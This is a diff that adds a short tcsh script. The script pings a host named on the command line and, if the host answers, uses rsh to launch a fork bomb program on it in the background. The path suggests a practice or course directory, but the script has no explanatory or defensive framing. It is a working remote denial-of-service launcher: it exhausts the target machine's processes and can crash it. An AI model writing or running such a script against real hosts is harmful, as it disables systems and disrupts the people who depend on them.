@@ -1,0 +1,10 @@
+#!/bin/tcsh
+
+ping $1 1 >& /dev/null
+if ( $status == 1 ) then
+ echo $1 is not alive!
+ exit
+endif
+
+exec rsh $1 pract/other/forks/forkBomb.bsd &
+
